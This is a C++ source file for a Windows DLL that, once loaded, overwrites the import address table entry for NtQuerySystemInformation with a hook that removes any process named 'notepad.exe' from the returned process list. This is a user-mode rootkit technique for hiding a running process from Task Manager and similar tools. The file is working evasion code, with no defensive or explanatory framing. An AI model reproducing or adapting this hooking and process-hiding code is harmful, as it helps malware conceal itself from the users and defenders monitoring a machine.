#include <Windows.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <winternl.h>
#include <ntstatus.h>

const wchar_t* ProcessToHideName = L"notepad.exe";

typedef struct _MY_SYSTEM_PROCESS_INFORMATION
{
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER Reserved[3];
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    ULONG BasePriority;
    HANDLE ProcessId;
    HANDLE InheritedFromProcessId;
} MY_SYSTEM_PROCESS_INFORMATION, * PMY_SYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS(WINAPI* PNT_QUERY_SYSTEM_INFORMATION)(
    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength
    );

PNT_QUERY_SYSTEM_INFORMATION OriginalNtQuerySystemInformation =
(PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(GetModuleHandle("ntdll"),
    "NtQuerySystemInformation");

// Hooked function
NTSTATUS WINAPI HookedNtQuerySystemInformation(
    __in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout    PVOID                    SystemInformation,
    __in       ULONG                    SystemInformationLength,
    __out_opt  PULONG                   ReturnLength
)
{
    NTSTATUS status = OriginalNtQuerySystemInformation(SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength);
    if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status)
    {
        // Loop through the list of processes
        PMY_SYSTEM_PROCESS_INFORMATION pCurrent = NULL;
        PMY_SYSTEM_PROCESS_INFORMATION pNext = (PMY_SYSTEM_PROCESS_INFORMATION)
            SystemInformation;

        do
        {
            pCurrent = pNext;
            pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->
                NextEntryOffset);
            if (!wcsncmp(pNext->ImageName.Buffer, ProcessToHideName, pNext->ImageName.Length))
            {
                if (!pNext->NextEntryOffset)
                {
                    pCurrent->NextEntryOffset = 0;
                }
                else
                {
                    pCurrent->NextEntryOffset += pNext->NextEntryOffset;
                }
                pNext = pCurrent;
            }
        } while (pCurrent->NextEntryOffset != 0);
    }
    return status;
}

void StartHook() {
    MODULEINFO modInfo = { 0 };
    HMODULE hModule = GetModuleHandle(0);

    // Find the base address
    GetModuleInformation(GetCurrentProcess(), hModule, &modInfo, sizeof(MODULEINFO));

    char szAddress[64];

    // Find Import Directory
    LPBYTE pAddress = (LPBYTE)modInfo.lpBaseOfDll;
    PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)pAddress;

    PIMAGE_NT_HEADERS pINH = (PIMAGE_NT_HEADERS)(pAddress + pIDH->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pIOH = (PIMAGE_OPTIONAL_HEADER) & (pINH->OptionalHeader);
    PIMAGE_IMPORT_DESCRIPTOR pIID = (PIMAGE_IMPORT_DESCRIPTOR)(pAddress + pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    // Find ntdll.dll
    for (; pIID->Characteristics; pIID++) {
        if (!strcmp("ntdll.dll", (char*)(pAddress + pIID->Name)))
            break;
    }

    // Search for NtQuerySystemInformation
    PIMAGE_THUNK_DATA pITD = (PIMAGE_THUNK_DATA)(pAddress + pIID->OriginalFirstThunk);
    PIMAGE_THUNK_DATA pFirstThunkTest = (PIMAGE_THUNK_DATA)((pAddress + pIID->FirstThunk));
    PIMAGE_IMPORT_BY_NAME pIIBM = nullptr;

    for (; !(pITD->u1.Ordinal & IMAGE_ORDINAL_FLAG) && pITD->u1.AddressOfData; pITD++) {
        pIIBM = (PIMAGE_IMPORT_BY_NAME)(pAddress + pITD->u1.AddressOfData);
        if (!strcmp("NtQuerySystemInformation", (char*)(pIIBM->Name)))
            break;
        pFirstThunkTest++;
    }

    // Write over function pointer
    DWORD dwOld = NULL;
    VirtualProtect((LPVOID) & (pFirstThunkTest->u1.Function), sizeof(uintptr_t), PAGE_READWRITE, &dwOld);
    pFirstThunkTest->u1.Function = (uintptr_t)HookedNtQuerySystemInformation;
    VirtualProtect((LPVOID) & (pFirstThunkTest->u1.Function), sizeof(uintptr_t), dwOld, NULL);

    sprintf_s<64>(szAddress, "%s 0x%X", (char*)(pIIBM->Name), pFirstThunkTest->u1.Function);

    /*if (pIDH->e_magic == IMAGE_DOS_SIGNATURE)
        MessageBox(NULL, szAddress, "TEST", MB_OK);
    else
        MessageBox(NULL, "FAIL", "FAIL", MB_OK);*/

    CloseHandle(hModule);
}

bool __stdcall DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved)
{
    switch (dwReason)
    {
    case DLL_PROCESS_ATTACH:
        StartHook();
        break;
    }
    return TRUE;
}